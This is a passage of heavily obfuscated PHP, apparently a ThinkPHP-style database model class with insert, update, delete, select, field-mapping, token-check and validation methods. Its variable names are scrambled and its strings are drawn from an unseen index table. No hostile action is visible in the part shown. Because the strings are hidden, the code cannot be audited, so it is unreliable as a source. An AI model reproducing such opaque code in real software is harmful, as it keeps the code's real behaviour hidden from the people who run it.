CÏÂÕ Ã³ä: } protected function _beforeInsert(&$aÚá¶êöË, $c¥½¶‹¾»Ì) { } protected function _after_insert($e‚¬óÎÓÛ, $fˆÛŠÇÓã) { } public function addAll($báº£ù, $D£È‹’¢Ø¸ = array(), $bŞÜò›œÑø = false) { goto c¶Í»áÛ–; c¶Í»áÛ–: $c˜°œ›ìØµ =& $_SERVER[¹Ò‹Ò¹]; if (empty($báº£ù)) { $this->error = think_lang($c˜°œ›ìØµ[267]); return !1; } $D£È‹’¢Ø¸ = $this->_parseOptions($D£È‹’¢Ø¸); goto F“ìÅ°–; F“ìÅ°–: foreach ($báº£ù as $dÇï›–á±« => $FéÏÙ»ç¿) { $báº£ù[$dÇï›–á±«] = $this->_facade($FéÏÙ»ç¿); } if (method_exists($this->db, $c˜°œ›ìØµ[268])) { $bË‹éÛšÑê = $this->db->insertAll($báº£ù, $D£È‹’¢Ø¸, $bŞÜò›œÑø); } else { $this->startTrans(); foreach ($báº£ù as $dÇï›–á±« => $FéÏÙ»ç¿) { $bË‹éÛšÑê = $this->db->insert($FéÏÙ»ç¿, $D£È‹’¢Ø¸, $bŞÜò›œÑø); } $this->commit(); } if (!1 !== $bË‹éÛšÑê) { $A½©¢ƒ² = $this->getLastInsID(); if ($A½©¢ƒ²) { return $A½©¢ƒ²; } } goto B³‡º‡ØšÓ; B³‡º‡ØšÓ: return $bË‹éÛšÑê; goto dºŠ¿µ; dºŠ¿µ: } public function selectAdd($A§²½ŒéÎ = '', $d­›Ë¥•®ø = '', $F‡ª¡Ø¡¿ø = array()) { $Fµ‡‡íĞß¶ =& $_SERVER[¹Ò‹Ò¹]; $F‡ª¡Ø¡¿ø = $this->_parseOptions($F‡ª¡Ø¡¿ø); if (!1 === ($f´ÁšŸ¶ÈÁ = $this->db->selectInsert($A§²½ŒéÎ ? $A§²½ŒéÎ : $F‡ª¡Ø¡¿ø[$Fµ‡‡íĞß¶[269]], $d­›Ë¥•®ø ? $d­›Ë¥•®ø : $this->getTableName(), $F‡ª¡Ø¡¿ø))) { $this->error = think_lang($Fµ‡‡íĞß¶[270]); return !1; } else { return $f´ÁšŸ¶ÈÁ; } } public function save($e’”æôàĞé = '', $f„µÉø² = array()) { goto C¿¨«»Ëòù; B”ÕÓòœ•: $f„µÉø² = $this->_parseOptions($f„µÉø²); $d®Ï˜ÌÛ = $this->getPk(); if (!isset($f„µÉø²[$c•Ôù›‹­[271]])) { if (isset($e’”æôàĞé[$d®Ï˜ÌÛ])) { $d‘ñ¤È·‡[$d®Ï˜ÌÛ] = $e’”æôàĞé[$d®Ï˜ÌÛ]; $f„µÉø²[$c•Ôù›‹­[271]] = $d‘ñ¤È·‡; unset($e’”æôàĞé[$d®Ï˜ÌÛ]); } else { $this->error = think_lang($c•Ôù›‹­[270]); return !1; } } goto D×Êîƒõ­ê; D×Êîƒõ­ê: if (is_array($f„µÉø²[$c•Ôù›‹­[271]]) && isset($f„µÉø²[$c•Ôù›‹­[271]][$d®Ï˜ÌÛ])) { $D¬»ƒƒ‹‹ = $f„µÉø²[$c•Ôù›‹­[271]][$d®Ï˜ÌÛ]; } if (!1 === $this->_beforeUpdate($e’”æôàĞé, $f„µÉø²)) { return !1; } $aİÎîŒŠËÓ = $this->db->update($e’”æôàĞé, $f„µÉø²); goto aª†£‘©””; aª†£‘©””: if (!1 !== $aİÎîŒŠËÓ) { if (isset($D¬»ƒƒ‹‹)) { $e’”æôàĞé[$d®Ï˜ÌÛ] = $D¬»ƒƒ‹‹; } $this->_afterUpdate($e’”æôàĞé, $f„µÉø²); } return $aİÎîŒŠËÓ; goto Eà©¨äÂ¿ˆ; C¿¨«»Ëòù: $c•Ôù›‹­ =& $_SERVER[¹Ò‹Ò¹]; if (empty($e’”æôàĞé)) { if (!empty($this->data)) { $e’”æôàĞé = $this->data; $this->data = array(); } else { $this->error = think_lang($c•Ôù›‹­[267]); return !1; } } $e’”æôàĞé = $this->_facade($e’”æôàĞé); goto B”ÕÓòœ•; Eà©¨äÂ¿ˆ: } protected function _beforeUpdate(&$Eê‘ˆÔ¤, $dô²ãÜ‡É) { } protected function _afterUpdate($f¹ÈñÌ…Ş, $b›¥ù¦”†‘) { } public function delete($E·†ÓÜãœ = array()) { goto bª¦§§êÓ‹; fÂ©†‡‹Ç: $e®¸º•× = $this->db->delete($E·†ÓÜãœ); if (!1 !== $e®¸º•×) { $D‚ÁÍğÂÈ = array(); if (isset($e¯òæ©­Ü)) { $D‚ÁÍğÂÈ[$e‡Š¡Î­ÃÁ] = $e¯òæ©­Ü; } $this->_after_delete($D‚ÁÍğÂÈ, $E·†ÓÜãœ); } return $e®¸º•×; goto Bä‰ ‡Šˆ; bª¦§§êÓ‹: $eŠÙ†®•¬ =& $_SERVER[¹Ò‹Ò¹]; if (empty($E·†ÓÜãœ) && empty($this->options[$eŠÙ†®•¬[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $e‡Š¡Î­ÃÁ = $this->getPk(); goto d¥ºãÛÚë§; d¥ºãÛÚë§: if (is_numeric($E·†ÓÜãœ) || is_string($E·†ÓÜãœ)) { if (strpos($E·†ÓÜãœ, $eŠÙ†®•¬[47])) { $aŞ¸‘¬¿ß½[$e‡Š¡Î­ÃÁ] = array($eŠÙ†®•¬[272], $E·†ÓÜãœ); } else { $aŞ¸‘¬¿ß½[$e‡Š¡Î­ÃÁ] = $E·†ÓÜãœ; } $this->options[$eŠÙ†®•¬[271]] = $aŞ¸‘¬¿ß½; } $E·†ÓÜãœ = $this->_parseOptions(); if (is_array($E·†ÓÜãœ[$eŠÙ†®•¬[271]]) && isset($E·†ÓÜãœ[$eŠÙ†®•¬[271]][$e‡Š¡Î­ÃÁ])) { $e¯òæ©­Ü = $E·†ÓÜãœ[$eŠÙ†®•¬[271]][$e‡Š¡Î­ÃÁ]; } goto fÂ©†‡‹Ç; Bä‰ ‡Šˆ: } protected function _after_delete($F»±¸ˆ¦Ø, $dÂƒÔÔÑÖ‰) { } public function select($dËğ±ªÏ¡• = array()) { goto aæ¹ùÖìª‚; a¼ÀÌï›Â–: $this->_afterSelect($cí‡ë’ˆéÄ, $dËğ±ªÏ¡•); return $cí‡ë’ˆéÄ; goto fÃ˜ÍÛŞ¶¹; aæ¹ùÖìª‚: $FÒ½ê‘»ä =& $_SERVER[¹Ò‹Ò¹]; if (is_string($dËğ±ªÏ¡•) || is_numeric($dËğ±ªÏ¡•)) { $fä¡¬Î¢›Ú = $this->getPk(); if (strpos($dËğ±ªÏ¡•, $FÒ½ê‘»ä[47])) { $CâãØƒòÜ[$fä¡¬Î¢›Ú] = array($FÒ½ê‘»ä[272], $dËğ±ªÏ¡•); } else { $CâãØƒòÜ[$fä¡¬Î¢›Ú] = $dËğ±ªÏ¡•; } $this->options[$FÒ½ê‘»ä[271]] = $CâãØƒòÜ; } elseif (!1 === $dËğ±ªÏ¡•) { $dËğ±ªÏ¡• = $this->_parseOptions(); return $FÒ½ê‘»ä[273] . $this->db->buildSelectSql($dËğ±ªÏ¡•) . $FÒ½ê‘»ä[274]; } $dËğ±ªÏ¡• = $this->_parseOptions(); goto eİî’‚ø²; eİî’‚ø²: $cí‡ë’ˆéÄ = $this->db->select($dËğ±ªÏ¡•); if (!1 === $cí‡ë’ˆéÄ) { return !1; } if (empty($cí‡ë’ˆéÄ)) { return null; } goto a¼ÀÌï›Â–; fÃ˜ÍÛŞ¶¹: } protected function _afterSelect(&$a–ëÄÕô¦”, $A‡ë¦å†µŒ) { } public function buildSql($d¢†¸¥´ø = array()) { $EÎ¤¢¨É¡Ó =& $_SERVER[¹Ò‹Ò¹]; $d¢†¸¥´ø = $this->_parseOptions($d¢†¸¥´ø); return $EÎ¤¢¨É¡Ó[273] . $this->db->buildSelectSql($d¢†¸¥´ø) . $EÎ¤¢¨É¡Ó[274]; } public function optionsValue($F°‹÷³¾ö = null) { if (is_null($F°‹÷³¾ö)) { return $this->options; } elseif (is_array($F°‹÷³¾ö)) { $this->options = array_merge($this->options, $F°‹÷³¾ö); } } protected function _parseOptions($bÑíö³Å‡¿ = array()) { goto FŒõš²¯Å; c†Ì×—Æ²Ç: if (isset($bÑíö³Å‡¿[$Fôöê»õ„«[271]]) && is_array($bÑíö³Å‡¿[$Fôöê»õ„«[271]]) && !empty($A¢¼Ùˆ´´Ò) && !isset($bÑíö³Å‡¿[$Fôöê»õ„«[278]]) && !isset($bÑíö³Å‡¿[$Fôöê»õ„«[275]])) { foreach ($bÑíö³Å‡¿[$Fôöê»õ„«[271]] as $F–ô—ˆ‘·Ú => $D‘„Ô½ä±œ) { $F–ô—ˆ‘·Ú = trim($F–ô—ˆ‘·Ú); if (in_array($F–ô—ˆ‘·Ú, $A¢¼Ùˆ´´Ò, !0)) { if (is_scalar($D‘„Ô½ä±œ)) { $this->_parseType($bÑíö³Å‡¿[$Fôöê»õ„«[271]], $F–ô—ˆ‘·Ú); } } elseif (!is_numeric($F–ô—ˆ‘·Ú) && $Fôöê»õ„«[70] != substr($F–ô—ˆ‘·Ú, 0, 1) && !1 === strpos($F–ô—ˆ‘·Ú, $Fôöê»õ„«[94]) && !1 === strpos($F–ô—ˆ‘·Ú, $Fôöê»õ„«[256]) && !1 === strpos($F–ô—ˆ‘·Ú, $Fôöê»õ„«[279]) && !1 === strpos($F–ô—ˆ‘·Ú, $Fôöê»õ„«[280])) { unset($bÑíö³Å‡¿[$Fôöê»õ„«[271]][$F–ô—ˆ‘·Ú]); } } } $this->_options_filter($bÑíö³Å‡¿); return $bÑíö³Å‡¿; goto B°¦‘É²¼Ö; FŒõš²¯Å: $Fôöê»õ„« =& $_SERVER[¹Ò‹Ò¹]; if (is_array($bÑíö³Å‡¿)) { $bÑíö³Å‡¿ = array_merge($this->options, $bÑíö³Å‡¿); } $this->options = array(); goto DîÏñ´µ³ò; DîÏñ´µ³ò: if (!isset($bÑíö³Å‡¿[$Fôöê»õ„«[275]])) { $bÑíö³Å‡¿[$Fôöê»õ„«[275]] = $this->getTableName(); $A¢¼Ùˆ´´Ò = $this->fields; } else { $A¢¼Ùˆ´´Ò = $this->getDbFields(); } if (!empty($bÑíö³Å‡¿[$Fôöê»õ„«[276]])) { $bÑíö³Å‡¿[$Fôöê»õ„«[275]] .= $Fôöê»õ„«[50] . $bÑíö³Å‡¿[$Fôöê»õ„«[276]]; } $bÑíö³Å‡¿[$Fôöê»õ„«[277]] = $this->name; goto c†Ì×—Æ²Ç; B°¦‘É²¼Ö: } protected function _options_filter(&$d´®¯†Ñœ) { } protected function _parseType(&$cÊ…ï¾Ì¨†, $Bƒ…†È„ô«) { $eŠ¹›õ¯·ã =& $_SERVER[¹Ò‹Ò¹]; if (empty($this->options[$eŠ¹›õ¯·ã[281]][$eŠ¹›õ¯·ã[4] . $Bƒ…†È„ô«])) { $B§ª¹âÍŞ = strtolower($this->fields[$eŠ¹›õ¯·ã[248]][$Bƒ…†È„ô«]); if (!1 !== strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[282])) { } elseif (!1 === strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[283]) && !1 !== strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[284])) { $cÊ…ï¾Ì¨†[$Bƒ…†È„ô«] = intval($cÊ…ï¾Ì¨†[$Bƒ…†È„ô«]); } elseif (!1 !== strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[285]) || !1 !== strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[286])) { $cÊ…ï¾Ì¨†[$Bƒ…†È„ô«] = floatval($cÊ…ï¾Ì¨†[$Bƒ…†È„ô«]); } elseif (!1 !== strpos($B§ª¹âÍŞ, $eŠ¹›õ¯·ã[287])) { $cÊ…ï¾Ì¨†[$Bƒ…†È„ô«] = (bool) $cÊ…ï¾Ì¨†[$Bƒ…†È„ô«]; } } } public function find($e‚±ÃÔÊ˜ = array()) { goto cóí’‡ªÁÃ; cƒÇá²ÂòÇ: if (empty($aÔØ‘¿áƒá)) { return null; } $this->data = $aÔØ‘¿áƒá[0]; $this->_afterFind($this->data, $e‚±ÃÔÊ˜); goto a·¦‚â²­; a÷»»ø ‚œ: $e‚±ÃÔÊ˜ = $this->_parseOptions(); $aÔØ‘¿áƒá = $this->db->select($e‚±ÃÔÊ˜); if (!1 === $aÔØ‘¿áƒá) { return !1; } goto cƒÇá²ÂòÇ; a·¦‚â²­: if (!empty($this->options[$CóÎ”˜Ó­†[289]])) { return $this->returnResult($this->data, $this->options[$CóÎ”˜Ó­†[289]]); } return $this->data; goto f×¼ÉÅƒòŒ; cóí’‡ªÁÃ: $CóÎ”˜Ó­† =& $_SERVER[¹Ò‹Ò¹]; if (is_numeric($e‚±ÃÔÊ˜) || is_string($e‚±ÃÔÊ˜)) { $bÏê…ß±¬Å[$this->getPk()] = intval($e‚±ÃÔÊ˜); $this->options[$CóÎ”˜Ó­†[271]] = $bÏê…ß±¬Å; } $this->options[$CóÎ”˜Ó­†[288]] = 1; goto a÷»»ø ‚œ; f×¼ÉÅƒòŒ: } protected function _afterFind(&$a¹ÊÉ°ñ†˜, $bÜ´ÂÂ‡ˆ®) { } protected function returnResult($E‹ºÏ‚ì, $Bƒ¥±Ï‰¿¼ = '') { $CÃß²ŠÏ¶› =& $_SERVER[¹Ò‹Ò¹]; if ($Bƒ¥±Ï‰¿¼) { if (is_callable($Bƒ¥±Ï‰¿¼)) { return call_user_func($Bƒ¥±Ï‰¿¼, $E‹ºÏ‚ì); } switch (strtolower($Bƒ¥±Ï‰¿¼)) { case $CÃß²ŠÏ¶›[290]: return json_encode($E‹ºÏ‚ì); case $CÃß²ŠÏ¶›[291]: return xml_encode($E‹ºÏ‚ì); } } return $E‹ºÏ‚ì; } public function parseFieldsMap($e²‘åÛÑò÷, $dÊã¶­¶Èã = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e‚ùñîÄÊÓ => $f¹÷ËêË×ã) { if ($dÊã¶­¶Èã == 1) { if (isset($e²‘åÛÑò÷[$f¹÷ËêË×ã])) { $e²‘åÛÑò÷[$e‚ùñîÄÊÓ] = $e²‘åÛÑò÷[$f¹÷ËêË×ã]; unset($e²‘åÛÑò÷[$f¹÷ËêË×ã]); } } else { if (isset($e²‘åÛÑò÷[$e‚ùñîÄÊÓ])) { $e²‘åÛÑò÷[$f¹÷ËêË×ã] = $e²‘åÛÑò÷[$e‚ùñîÄÊÓ]; unset($e²‘åÛÑò÷[$e‚ùñîÄÊÓ]); } } } } return $e²‘åÛÑò÷; } public function setField($Bæ°«ˆ†»å, $b–»Ú˜Ó„— = '') { if (is_array($Bæ°«ˆ†»å)) { $aÅŸ²İé = $Bæ°«ˆ†»å; } else { $aÅŸ²İé[$Bæ°«ˆ†»å] = $b–»Ú˜Ó„—; } return $this->save($aÅŸ²İé); } public function setAdd($a’ƒ¥¤¢Í‡, $B³Á ­ùí­ = 1) { $EİóÏ¬¼¾« =& $_SERVER[¹Ò‹Ò¹]; $BïË¬‰Ë¼ = $a’ƒ¥¤¢Í‡ . $EİóÏ¬¼¾«[292] . $B³Á ­ùí­; if ($B³Á ­ùí­ < 0) { $BïË¬‰Ë¼ = $a’ƒ¥¤¢Í‡ . $B³Á ­ùí­; } return $this->setField($a’ƒ¥¤¢Í‡, array($EİóÏ¬¼¾«[293], $BïË¬‰Ë¼)); } public function getField($AÇ‚ö„Ëº, $dêñ«†§™ = null) { $fŸÀ™›êÔ÷ =& $_SERVER[¹Ò‹Ò¹]; $f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[269]] = $AÇ‚ö„Ëº; $f¥çÓ´”¢ô = $this->_parseOptions($f¥çÓ´”¢ô); $AÇ‚ö„Ëº = trim($AÇ‚ö„Ëº); if (strpos($AÇ‚ö„Ëº, $fŸÀ™›êÔ÷[47])) { if (!isset($f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[288]])) { $f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[288]] = is_numeric($dêñ«†§™) ? $dêñ«†§™ : $fŸÀ™›êÔ÷[33]; } $cšà‚›÷Çˆ = $this->db->select($f¥çÓ´”¢ô); if (!empty($cšà‚›÷Çˆ)) { goto dêÑå†Îì¥; dêÑå†Îì¥: $f…±»í…Äâ = explode($fŸÀ™›êÔ÷[47], $AÇ‚ö„Ëº); $AÇ‚ö„Ëº = array_keys($cšà‚›÷Çˆ[0]); $DÑö§¥á’¦ = array_shift($AÇ‚ö„Ëº); goto fŠ»¶à¦; fŠ»¶à¦: $eĞ‹õÇ×£® = array_shift($AÇ‚ö„Ëº); $aÒÏ´ä¨·š = array(); $aÑÃ£ïÙŠ = count($f…±»í…Äâ); goto dÒÔ‹ñÈº; dÒÔ‹ñÈº: foreach ($cšà‚›÷Çˆ as $E›¢ ¨ÀÂ–) { $bö†ØõÂ¹Ò = $E›¢ ¨ÀÂ–[$DÑö§¥á’¦]; if (2 == $aÑÃ£ïÙŠ) { $aÒÏ´ä¨·š[$bö†ØõÂ¹Ò] = $E›¢ ¨ÀÂ–[$eĞ‹õÇ×£®]; } else { $aÒÏ´ä¨·š[$bö†ØõÂ¹Ò] = is_string($dêñ«†§™) ? implode($dêñ«†§™, $E›¢ ¨ÀÂ–) : $E›¢ ¨ÀÂ–; } } return $aÒÏ´ä¨·š; goto aà±‹¹— ³; aà±‹¹— ³: } } else { if (!0 !== $dêñ«†§™) { $f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[288]] = is_numeric($dêñ«†§™) ? $dêñ«†§™ : 1; } if ($dêñ«†§™ === $fŸÀ™›êÔ÷[251]) { unset($f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[288]]); } $E›¢ ¨ÀÂ– = $this->db->select($f¥çÓ´”¢ô); if (!empty($E›¢ ¨ÀÂ–)) { if ($dêñ«†§™ === $fŸÀ™›êÔ÷[251]) { return reset($E›¢ ¨ÀÂ–[0]); } if (!0 !== $dêñ«†§™ && 1 == $f¥çÓ´”¢ô[$fŸÀ™›êÔ÷[288]]) { return reset($E›¢ ¨ÀÂ–[0]); } foreach ($E›¢ ¨ÀÂ– as $D÷ÈæËø´) { $bÑ’„˜ø‡¹[] = $D÷ÈæËø´[$AÇ‚ö„Ëº]; } return $bÑ’„˜ø‡¹; } } return null; } public function create($bòç¾î¥ª„ = '', $CÙË£ñì‹ = '') { goto D‹–ˆ–¢Á™; c£Â«ç™ºó: return $bòç¾î¥ª„; goto DÔ²Àì¤²; AíšöÙ¹Œ¢: if (isset($b’ßÖ¿Êç‰)) { if (is_string($b’ßÖ¿Êç‰)) { $b’ßÖ¿Êç‰ = explode($F×–†…åµ[47], $b’ßÖ¿Êç‰); } if (think_config($F×–†…åµ[294])) { $b’ßÖ¿Êç‰[] = think_config($F×–†…åµ[295]); } foreach ($bòç¾î¥ª„ as $EÙáĞŠëêµ => $F—ÙÀèŠÓƒ) { if (!in_array($EÙáĞŠëêµ, $b’ßÖ¿Êç‰)) { unset($bòç¾î¥ª„[$EÙáĞŠëêµ]); } } } if (!$this->autoValidation($bòç¾î¥ª„, $CÙË£ñì‹)) { return !1; } if (!$this->autoCheckToken($bòç¾î¥ª„)) { $this->error = think_lang($F×–†…åµ[296]); return !1; } goto C­Çˆ¶º˜©; C­Çˆ¶º˜©: if ($this->autoCheckFields) { $b’ßÖ¿Êç‰ = $this->getDbFields(); foreach ($bòç¾î¥ª„ as $EÙáĞŠëêµ => $F—ÙÀèŠÓƒ) { if (!in_array($EÙáĞŠëêµ, $b’ßÖ¿Êç‰)) { unset($bòç¾î¥ª„[$EÙáĞŠëêµ]); } elseif (MAGIC_QUOTES_GPC && is_string($F—ÙÀèŠÓƒ)) { $bòç¾î¥ª„[$EÙáĞŠëêµ] = stripslashes($F—ÙÀèŠÓƒ); } } } $this->autoOperation($bòç¾î¥ª„, $CÙË£ñì‹); $this->data = $bòç¾î¥ª„; goto c£Â«ç™ºó; CšˆÏ™¡Ú´: $bòç¾î¥ª„ = $this->parseFieldsMap($bòç¾î¥ª„, 0); $CÙË£ñì‹ = $CÙË£ñì‹ ? $CÙË£ñì‹ : (!empty($bòç¾î¥ª„[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F×–†…åµ[269]])) { $b’ßÖ¿Êç‰ = $this->options[$F×–†…åµ[269]]; unset($this->options[$F×–†…åµ[269]]); } elseif ($CÙË£ñì‹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $b’ßÖ¿Êç‰ = $this->insertFields; } elseif ($CÙË£ñì‹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $b’ßÖ¿Êç‰ = $this->updateFields; } goto AíšöÙ¹Œ¢; D‹–ˆ–¢Á™: $F×–†…åµ =& $_SERVER[¹Ò‹Ò¹]; if (empty($bòç¾î¥ª„)) { $bòç¾î¥ª„ = $_POST; } elseif (is_object($bòç¾î¥ª„)) { $bòç¾î¥ª„ = get_object_vars($bòç¾î¥ª„); } if (empty($bòç¾î¥ª„) || !is_array($bòç¾î¥ª„)) { $this->error = think_lang($F×–†…åµ[267]); return !1; } goto CšˆÏ™¡Ú´; DÔ²Àì¤²: } public function autoCheckToken($cš¾÷â‘ò) { $f·µšˆø§§ =& $_SERVER[¹Ò‹Ò¹]; if (isset($this->options[$f·µšˆø§§[297]]) && !$this->options[$f·µšˆø§§[297]]) { return !0; } if (think_config($f·µšˆø§§[294])) { $e¤‘Ïó”¶ = think_config($f·µšˆø§§[295]); if (!isset($cš¾÷â‘ò[$e¤‘Ïó”¶]) || Session::get($e¤‘Ïó”¶)) { return !1; } list($aŒùŠ±ß‘, $eìéÃŠ¥‡ì) = explode($f·µšˆø§§[70], $cš¾÷â‘ò[$e¤‘Ïó”¶]); if ($eìéÃŠ¥‡ì && Session::get($e¤‘Ïó”¶ . $f·µšˆø§§[94] . $aŒùŠ±ß‘) === $eìéÃŠ¥‡ì) { Session::remove($e¤‘Ïó”¶ . $f·µšˆø§§[94] . $aŒùŠ±ß‘); return !0; } if (think_config($f·µšˆø§§[298])) { Session::remove($e¤‘Ïó”¶ . $f·µšˆø§§[94] . $aŒùŠ±ß‘); } return !1; } return !0; } public function regex($aÏÀ»àÀ’Ã, $a‹Ó¯·¸«í) { $A˜ÃåÀ¶Œ =& $_SERVER[¹Ò‹Ò¹]; $cáøª²«Âã = array($A˜ÃåÀ¶Œ[299] => $A˜ÃåÀ¶Œ[300], $A˜ÃåÀ¶Œ[301] => $A˜ÃåÀ¶Œ[302], $A˜ÃåÀ¶Œ[303] => $A˜ÃåÀ¶Œ[304], $A˜ÃåÀ¶Œ[305] => $A˜ÃåÀ¶Œ[306], $A˜ÃåÀ¶Œ[307] => $A˜ÃåÀ¶Œ[308], $A˜ÃåÀ¶Œ[309] => $A˜ÃåÀ¶Œ[310], $A˜ÃåÀ¶Œ[311] => $A˜ÃåÀ¶Œ[312], $A˜ÃåÀ¶Œ[286] => $A˜ÃåÀ¶Œ[313], $A˜ÃåÀ¶Œ[314] => $A˜ÃåÀ¶Œ[315]); if (isset($cáøª²«Âã[strtolower($a‹Ó¯·¸«í)])) { $a‹Ó¯·¸«í = $cáøª²«Âã[strtolower($a‹Ó¯·¸«í)]; } return preg_match($a‹Ó¯·¸«í, $aÏÀ»àÀ’Ã) === 1; } private function autoOperation(&$D‰õ«òæ×…, $dõåøœ¨Ò) { $dÑÜ»­™»‰ =& $_SERVER[¹Ò‹Ò¹]; if (!empty($this->options[$dÑÜ»­™»‰[316]])) { $c›¤¹ä›Ó‡ = $this->options[$dÑÜ»­™»‰[316]]; unset($this->options[$dÑÜ»­™»‰[316]]); } elseif (!empty($this->_auto)) { $c›¤¹ä›Ó‡ = $this->_auto; } if (isset($c›¤¹ä›Ó‡)) { foreach ($c›¤¹ä›Ó‡ as $fÆ“»Êæ¯) { if (empty($fÆ“»Êæ¯[2])) { $fÆ“»Êæ¯[2] = THINK_MODEL_INSERT; } if ($dõåøœ¨Ò == $fÆ“»Êæ¯[2] || $fÆ“»Êæ¯[2] == THINK_MODEL_BOTH) { switch (trim($fÆ“»Êæ¯[3])) { case $dÑÜ»­™»‰[317]: case $dÑÜ»­™»‰[318]: $FœéÂõîøğ = isset($fÆ“»Êæ¯[4]) ? (array) $fÆ“»Êæ¯[4] : array(); if (isset($D‰õ«òæ×…[$fÆ“»Êæ¯[0]])) { array_unshift($FœéÂõîøğ, $D‰õ«òæ×…[$fÆ“»Êæ¯[0]]); } if ($dÑÜ»­™»‰[317] == $fÆ“»Êæ¯[3]) { $D‰õ«òæ×…[$fÆ“»Êæ¯[0]] = call_user_func_array($fÆ“»Êæ¯[1], $FœéÂõîøğ); } else { $D‰õ«òæ×…[$fÆ“»Êæ¯[0]] = call_user_func_array(array(&$this, $fÆ“»Êæ¯[1]), $FœéÂõîøğ); } break; case $dÑÜ»­™»‰[269]: $D‰õ«òæ×…[$fÆ“»Êæ¯[0]] = $D‰õ«òæ×…[$fÆ“»Êæ¯[1]]; break; case $dÑÜ»­™»‰[319]: if ($dÑÜ»­™»‰[33] === $D‰õ«òæ×…[$fÆ“»Êæ¯[0]]) { unset($D‰õ«òæ×…[$fÆ“»Êæ¯[0]]); } break; case $dÑÜ»­™»‰[320]: default: $D‰õ«òæ×…[$fÆ“»Êæ¯[0]] = $fÆ“»Êæ¯[1]; } if (!1 === $D‰õ«òæ×…[$fÆ“»Êæ¯[0]]) { unset($D‰õ«òæ×…[$fÆ“»Êæ¯[0]]); } } } } return $D‰õ«òæ×…; } protected function autoValidation($Có™¤ƒÊ, $F˜ÓÒÀ™ğÓ) { $Föä·»‚‘ª =& $_SERVER[¹Ò‹Ò¹]; if (!empty($this->options[$Föä·»‚‘ª[321]])) { $DÇËå”œÃé = $this->options[$Föä·»‚‘ª[321]]; unset($this->options[$Föä·»‚‘ª[321]]); } elseif (!empty($this->_validate)) { $DÇËå”œÃé = $this->_validate; } if (isset($DÇËå”œÃé)) { if ($this->patchValidate) { $this->error = array(); } foreach ($DÇËå”œÃé as $aÛÂèÍìÄ => $AŸ‹“è‚òâ) { if (empty($AŸ‹“è‚òâ[5]) || $AŸ‹“è‚òâ[5] == THINK_MODEL_BOTH || $AŸ‹“è‚òâ[5] == $F˜ÓÒÀ™ğÓ) { if (0 == strpos($AŸ‹“è‚òâ[2], $Föä·»‚‘ª[322]) && strpos($AŸ‹“è‚òâ[2], $Föä·»‚‘ª[323])) { $AŸ‹“è‚òâ[2] = think_lang(substr($AŸ‹“è‚òâ[2], 2, -1)); } $AŸ‹“è‚òâ[3] = isset($AŸ‹“è‚òâ[3]) ? $AŸ‹“è‚òâ[3] : THINK_EXISTS_VALIDATE; $AŸ‹“è‚òâ[4] = isset($AŸ‹“è‚òâ[4]) ? $AŸ‹“è‚òâ[4] : $Föä·»‚‘ª[324]; switch ($AŸ‹“è‚òâ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Có™¤ƒÊ, $AŸ‹“è‚òâ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Föä·»‚‘ª[33] != trim($Có™¤ƒÊ[$AŸ‹“è‚òâ[0]])) { if (!1 === $this->_validationField($Có™¤ƒÊ, $AŸ‹“è‚òâ)) { return !1; } } break; default: if (isset($Có™¤ƒÊ[$AŸ‹“è‚òâ[0]])) { if (!1 === $this->_validationField($Có™¤ƒÊ, $AŸ‹“è‚òâ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($b¢ÓÂº¼ç›, $e…õ¨‘Àäª) { if (!1 === $this->_validationFieldItem($b¢ÓÂº¼ç›, $e…õ¨‘Àäª)) { if ($this->patchValidate) { $this->error[$e…õ¨‘Àäª[0]] = $e…õ¨‘Àäª[2]; } else { $this->error = $e…õ¨‘Àäª[2]; return !1; } } return; } protected function _validationFieldItem($dÙíÉ’ÖµÌ, $CáµœŠ†¾¶) { $C¹¥°äƒ =& $_SERVER[¹Ò‹Ò¹]; switch (strtolower(trim($CáµœŠ†¾¶[4]))) { case $C¹¥°äƒ[317]: case $C¹¥°äƒ[318]: $b¢«„£ÔŒ = isset($CáµœŠ†¾¶[6]) ? (array) $CáµœŠ†¾¶[6] : array(); if (is_string($CáµœŠ†¾¶[0]) && strpos($CáµœŠ†¾¶[0], $C¹¥°äƒ[47])) { $CáµœŠ†¾¶[0] = explode($C¹¥°äƒ[47], $CáµœŠ†¾¶[0]); } if (is_array($CáµœŠ†¾¶[0])) { foreach ($CáµœŠ†¾¶[0] as $D‚×Ç‰÷ßƒ) { $C±¿¤£ƒ‹©[$D‚×Ç‰÷ßƒ] = $dÙíÉ’ÖµÌ[$D‚×Ç‰÷ßƒ]; } array_unshift($b¢«„£ÔŒ, $C±¿¤£ƒ‹©); } else { array_unshift($b¢«„£ÔŒ, $dÙíÉ’ÖµÌ[$CáµœŠ†¾¶[0]]); } if ($C¹¥°äƒ[317] == $CáµœŠ†¾¶[4]) { return call_user_func_array($CáµœŠ†¾¶[1], $b¢«„£ÔŒ); } else { return call_user_func_array(array(&$this, $CáµœŠ†¾¶[1]), $b¢«„£ÔŒ); } case $C¹¥°äƒ[325]: return $dÙíÉ’ÖµÌ[$CáµœŠ†¾¶[0]] == $dÙíÉ’ÖµÌ[$CáµœŠ†¾¶[1]]; case $C¹¥°äƒ[326]: if (is_string($CáµœŠ†¾¶[0]) && strpos($CáµœŠ†¾¶[0], $C¹¥°äƒ[47])) { $CáµœŠ†¾¶[0] = explode($C¹¥°äƒ[47], $CáµœŠ†¾¶[0]); } $f¥¥®…•á‚ = array(); if (is_array($CáµœŠ†¾¶[0])) { foreach ($CáµœŠ†¾¶[0] as $D‚×Ç‰÷ßƒ) { 